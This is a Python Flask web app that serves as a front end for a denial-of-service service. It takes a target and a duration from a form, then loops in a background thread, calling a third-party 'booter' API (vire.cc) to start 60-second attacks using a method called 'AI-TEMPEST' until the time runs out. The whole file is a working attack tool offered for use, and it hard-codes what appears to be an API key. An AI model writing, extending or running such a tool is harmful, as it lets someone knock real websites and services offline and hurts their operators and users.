from flask import Flask, render_template, request, jsonify
import requests
import time
import threading
import os
import logging

app = Flask(__name__)

# Configuration
USER_API_KEY = "38698f04-75e1-4bb6-904e-17850e4ca52d"
API_BASE_URL = "https://vire.cc/api/v1"

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# API utility function
def call_api(path: str, data: dict = None, method: str = 'GET') -> dict:
    full_url = f"{API_BASE_URL}/{path}"
    if data is None:
        data = {}
    data['user'] = USER_API_KEY

    try:
        if method.upper() == 'GET':
            response = requests.get(full_url, params=data, timeout=15)
        elif method.upper() == 'POST':
            response = requests.post(full_url, json=data, timeout=15)
        else:
            return {"success": False, "error": f"Unsupported HTTP method: {method}"}

        response.raise_for_status()
        response_data = response.json()

        if response_data.get('success') is False:
            error_message = response_data.get('error', 'Unknown API Error')
            return {"success": False, "error": f"API Error: {error_message}"}

        return {"success": True, "data": response_data.get('data', response_data)}

    except requests.exceptions.HTTPError as e:
        error_msg = f"{e.response.status_code} Client Error: {e.response.reason}"
        try:
            error_details = e.response.json().get('error', '')
            if error_details:
                error_msg += f" - {error_details}"
        except json.JSONDecodeError:
            pass
        return {"success": False, "error": error_msg}
    except requests.exceptions.RequestException as e:
        return {"success": False, "error": "Connection Error: Could not reach the API."}
    except Exception as e:
        return {"success": False, "error": f"An unexpected error occurred: {e}"}

# Function to launch a DDoS attack
def launch_attack(target: str, total_duration: int) -> None:
    start_time = time.time()
    elapsed_time = 0

    while elapsed_time < total_duration:
        # Check the status to see if there are any running attacks
        status_response = call_api("status", method='GET')
        if status_response["success"]:
            attack_summary = status_response["data"].get('attack_summary', {})
            if attack_summary.get('total_running', 0) == 0:
                # Launch a new attack
                attack_response = call_api("start", data={"target": target, "time": 60, "method": "AI-TEMPEST"}, method='POST')
                if attack_response["success"]:
                    logger.info(f"Attack launched on {target} with default time and method.")
                else:
                    logger.error(f"Failed to launch attack: {attack_response['error']}")
            else:
                logger.info("Waiting for the current attack to finish...")
                time.sleep(10)  # Wait for 10 seconds before checking again
        else:
            logger.error(f"Failed to check status: {status_response['error']}")

        elapsed_time = time.time() - start_time

    logger.info("Total specified time has elapsed. Exiting the loop.")

# Flask routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/launch', methods=['POST'])
def launch():
    target = request.form['target']
    total_duration = int(request.form['duration'])

    # Start the attack in a separate thread
    attack_thread = threading.Thread(target=launch_attack, args=(target, total_duration))
    attack_thread.start()

    return jsonify({"message": "Attack launched successfully!"})

if __name__ == '__main__':
    # Get the port from the environment variable or use 10000 as default
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=True)
